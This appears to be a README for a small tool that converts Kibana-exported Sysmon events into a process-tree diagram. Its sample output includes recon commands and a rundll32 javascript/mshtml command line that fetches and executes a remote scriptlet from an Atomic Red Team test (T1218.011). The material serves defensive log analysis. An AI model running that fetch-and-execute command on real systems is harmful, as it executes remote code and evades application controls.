# treeify_sysmon_events

Take in a CSV generated from kibana of your sysmon events, and output a tree style diagram showing the event hierarchy

```
1
└── [N/A] PID: 7652 - Creation Point
    ├── [171,569] PID: 3884 - "C:\Windows\system32\HOSTNAME.EXE"
    ├── [171,570] PID: 2052 - "C:\Windows\system32\whoami.exe"
    └── [171,571] PID: 3180 - "cmd.exe" /c "rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.011/src/T1218.011.sct").Exec();window.close();"
        └── [171,572] PID: 5772 - rundll32.exe  javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.011/src/T1218.011.sct").Exec();window.close();
            ├── [171,573] PID: 1876 - "C:\Windows\System32\notepad.exe" 
            ├── [171,577] Event: network connection
            └── [171,578] Event: DNSEvent
```
numbers in `[]` are the event log ID.
